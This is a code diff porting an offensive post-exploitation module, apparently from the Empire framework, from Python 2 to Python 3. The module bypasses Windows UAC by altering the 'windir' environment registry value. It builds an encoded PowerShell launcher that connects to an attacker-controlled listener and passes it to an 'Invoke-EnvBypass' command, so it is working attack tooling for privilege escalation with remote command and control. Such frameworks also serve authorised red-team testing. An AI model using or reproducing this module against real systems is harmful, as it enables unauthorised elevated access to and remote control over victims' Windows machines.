@@ -1,6 +1,9 @@
+from __future__ import print_function
+from builtins import str
+from builtins import object
 from lib.common import helpers
 
-class Module:
+class Module(object):
 
     def __init__(self, mainMenu, params=[]):
 
@@ -12,7 +15,11 @@ class Module:
             'Description': ("Bypasses UAC (even with Always Notify level set) by by performing an registry modification"
                             " of the \"windir\" value in \"Environment\" based on James Forshaw findings"
                             "(https://tyranidslair.blogspot.cz/2017/05/exploiting-environment-variables-in.html)"),
-        
+
+            'Software': '',
+
+            'Techniques': ['T1088'],
+
             'Background' : True,
 
             'OutputExtension' : None,
@@ -87,7 +94,7 @@ class Module:
         try:
             f = open(moduleSource, 'r')
         except:
-            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
+            print(helpers.color("[!] Could not read module source path at: " + str(moduleSource)))
             return ""
 
         moduleCode = f.read()
@@ -97,14 +104,14 @@ class Module:
 
         if not self.mainMenu.listeners.is_listener_valid(listenerName):
             # not a valid listener, return nothing for the script
-            print helpers.color("[!] Invalid listener: " + listenerName)
+            print(helpers.color("[!] Invalid listener: " + listenerName))
             return ""
         else:
             # generate the PowerShell one-liner with all of the proper options set
             launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
             encScript = launcher.split(" ")[-1]
             if launcher == "":
-                print helpers.color("[!] Error in launcher generation.")
+                print(helpers.color("[!] Error in launcher generation."))
                 return ""
             else:
                 script += "Invoke-EnvBypass -Command \"%s\"" % (encScript)
